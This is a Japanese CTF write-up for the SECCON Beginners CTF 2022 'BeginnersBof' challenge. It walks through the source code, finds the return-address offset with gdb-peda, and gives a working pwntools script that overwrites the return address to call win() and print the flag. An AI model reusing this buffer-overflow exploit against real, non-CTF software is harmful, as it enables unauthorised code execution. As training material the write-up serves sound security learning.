# BeginnersBof
 問題のソースコードは以下の通り。
 [SECCON Beginners CTF  BeginnersBof](https://github.com/SECCON/Beginners_CTF_2022/tree/main/pwnable/BeginnersBof)
 <details><summary>ソースコード</summary>
    
```
#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>
#include <err.h>

#define BUFSIZE 0x10

void win() {
    char buf[0x100];
    int fd = open("flag.txt", O_RDONLY);
    if (fd == -1)
	err(1, "Flag file not found...\n");
    write(1, buf, read(fd, buf, sizeof(buf)));
    close(fd);
}

int main() {
    int len = 0;
    char buf[BUFSIZE] = {0};
    puts("How long is your name?");
    scanf("%d", &len);
    char c = getc(stdin);
    if (c != '\n')
	ungetc(c, stdin);
    puts("What's your name?");
    fgets(buf, len, stdin);
    printf("Hello %s", buf);
}

__attribute__((constructor))
void init() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
    alarm(60);
}
    
```
    
</details>

## 問題解決の見通し
ソースコードから、win関数を呼び出せればフラグが出力されそうだと予測できる。そしてもともとBUFSIZEで変数bufの大きさは固定されているにも関わらず、main関数内のscanf関数で入力した数値の分だけfgets関数で入力できるのでバッファオーバーフロー攻撃の脆弱性が存在することが分かる。さらにmain関数からwin関数への分岐がないのでバッファオーバーフローでmain関数のリターンアドレスをwin関数のアドレスに書き換えることを考える。

## STEP1 アドレスの調査
リターンアドレスを書き換えるにあたってwin関数のアドレスとmain関数のリターンアドレスが格納されているアドレスを特定する必要がある。ここでは簡単なwin関数のアドレスから調べることとする。しかし、これに関してはどちらから調べても支障はない。
win関数のアドレスはgdbのコマンド一つで求められる。
    
```
gdb-peda$ info addr win
Symbol "win" is at 0x4011e6 in a file compiled without debugging.
```
続いてmain関数のリターンアドレスの位置を考える。
ここでmain関数中のprintf関数を呼び出す位置にブレークポイントを設置してレジスタの状態を見る。
    
```
    --レジスタ--
RAX: 0x0
RBX: 0x0
RCX: 0x7ffff7af2031 (<__GI___libc_read+17>:     cmp    rax,0xfffffffffffff000)
RDX: 0x7ffff7dcf8d0 --> 0x0
RSI: 0x7fffffffe110 ('a' <repeats 12 times>, "\n")
RDI: 0x402051 ("Hello %s")
RBP: 0x7fffffffe130 --> 0x401370 (<__libc_csu_init>:    endbr64)
RSP: 0x7fffffffe110 ('a' <repeats 12 times>, "\n")
RIP: 0x40130a (<main+167>:      call   0x401050 <printf@plt>)
    
    --スタック--
0000| 0x7fffffffe110 ('a' <repeats 12 times>, "\n")
0008| 0x7fffffffe118 --> 0xa61616161 ('aaaa\n')
0016| 0x7fffffffe120 --> 0x7fffffffe210 --> 0x1
0024| 0x7fffffffe128 --> 0xa00000000002710
0032| 0x7fffffffe130 --> 0x401370 (<__libc_csu_init>:   endbr64)
0040| 0x7fffffffe138 --> 0x7ffff7a03c87 (<__libc_start_main+231>:       mov    edi,eax)
0048| 0x7fffffffe140 --> 0x1
0056| 0x7fffffffe148 --> 0x7fffffffe218 --> 0x7fffffffe48a
```
    
ここから、RSPからRBPへは0x20だけの間が空いていることが分かる。よって、main関数のリターンアドレスはRSP+0x28のアドレスにある。このときのスタック内部の概要と目標とする状況は以下の通り。
```
|---------------|<--rsp-->|------------|
|  user_input   |         |    'a'     |
|     0x20      |         |    0x28    |
|---------------|<--rbp-->|            |
| saved_rbp 0x8 |         |            |
|---------------|         |------------|
| return_addr   |---BOF-->| win_addr   |
|---------------|         |------------|
```
    
## STEP2 バッファオーバーフロー実行
    
これで攻撃に必要な材料が揃ったので実際に攻撃を実行していく。ここで注意するポイントはアドレスを埋め込むとき、アドレスをリトルエンディアンに変換するのを忘れないことである。
    
### Solver
    
```
import sys
from pwn import *

bin_file = './chall'
context(os = 'linux', arch = 'amd64')

win_addr = 0x00000000004011e6

def attack(conn, **kwargs):
    buf1 = b'10000'
    conn.sendlineafter(b'name?', buf1)
    buf2 = b'a'*0x28+pack(win_addr)
    conn.sendlineafter(b'name?', buf2)


def main():
    #conn = remote('beginnersbof.quals.beginners.seccon.jp', 9000)
    conn = process(bin_file)
    attack(conn)
    conn.interactive()


if __name__ == '__main__':
    main()
    
```
### 実行結果
```
[+] Starting local process './chall': pid 11746
[*] Switching to interactive mode

Hello aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xe6@ctf4b{Y0u_4r3_4lr34dy_4_BOF_M45t3r!}
[*] Got EOF while reading in interactive
$
```
